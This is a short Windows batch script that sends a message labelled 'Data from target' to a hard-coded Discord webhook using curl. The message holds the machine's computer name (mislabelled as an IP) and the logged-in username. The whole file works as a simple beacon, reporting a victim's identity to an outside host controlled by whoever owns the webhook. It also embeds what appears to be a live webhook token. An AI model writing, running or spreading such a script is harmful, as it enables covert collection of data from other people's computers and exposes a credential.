@echo off
setlocal

:: Define the webhook URL
set "webhook_url=https://discord.com/api/webhooks/1391532249156947998/6COjLrMLUvb8Oe3uqBg0DVlPhPVWdpj7_QXNwNN9NhWLrrlFvSpAwZWrxjsvu5UOvbtm"

:: Prepare the message content
set "message=Data from target: IP: %COMPUTERNAME% User: %USERNAME%"

:: Send the message to the Discord webhook using curl
curl -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook_url%

:: Check if the message was sent successfully
if %errorlevel%==0 (
    echo Message sent successfully.
) else (
    echo Failed to send message.
)

endlocal
